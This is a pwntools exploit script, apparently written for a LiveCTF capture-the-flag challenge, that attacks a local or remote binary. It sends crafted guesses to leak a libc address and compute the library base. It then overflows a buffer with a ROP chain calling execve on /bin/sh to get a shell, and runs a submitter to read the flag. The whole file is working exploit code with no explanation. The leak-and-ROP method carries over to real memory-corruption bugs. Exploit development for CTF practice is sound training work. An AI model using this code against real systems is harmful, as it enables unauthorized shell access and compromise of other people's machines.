#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or "challenge_patched")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


HOST = os.environ.get("HOST", "localhost")
PORT = 31337

libc = ELF("./libc.so.6")

gdbscript = """
tbreak main
brva 0x179f
continue
""".format(**locals())

# -- Exploit goes here --
context.terminal = ["alacritty", "-e"]

if args.LOCAL:
    io = start()
else:
    io = remote(HOST, int(PORT))

io.sendline(b"10")
io.sendline(b"5")
io.recvuntil(b"guess")
io.sendline(b"AAAAAAAAA\xff")
io.recvuntil(b"guess")

io.sendline(b"zAAAAAAAA\xff" + b"\xff" * (0x63))
io.sendline(b"zAAAAAAAA\x0e" + b"\xff" * (0x63))
io.recvuntil(b"guess")
# io.interactive()


leak = io.recvuntil(b"guess")

leak += io.recvuntil(b"guess")
leak = leak.replace(b"\x1b[0m", b"")
leak = leak.replace(b" A ", b"")
leak = leak.replace(b"\x1b[1;30;43m", b"")
leak = leak.replace(b"\x1b[1;30;42m", b"")
leak = leak.replace(b" ", b"")

leak = leak[159:]
leak = u64(leak[:7].ljust(8, b"\x00"))

info(f"{hex(leak) = }")

libc.address = leak - 0x29D90
info(f"{hex(libc.address) = }")


# io.interactive()

test = b"z"
io.sendline(b"AAAAAAAAA" + test + b"AAAA")

print(test[0])
io.recvuntil(b"guess")

io.sendline(b"AAAAAAAAAAAAAAA" * test[0] * 12)

rop = ROP(libc)
payload = cyclic(cyclic_find(b"aaaeaaaf"))

rop.call("execve", [next(libc.search(b"/bin/sh")), 0, 0])
payload += rop.chain()

payload = payload.ljust(500, b"\x00")


io.sendline(payload)
io.clean()

import time

time.sleep(1)
io.sendline("./submitter")


for i in range(10):
    output = io.recvline(timeout=1)
    if b"LiveCTF{" in output:
        log.info("Flag: %s", output.decode().strip())
        break

    log.info("Output: %s", output.decode().strip())


io.interactive()
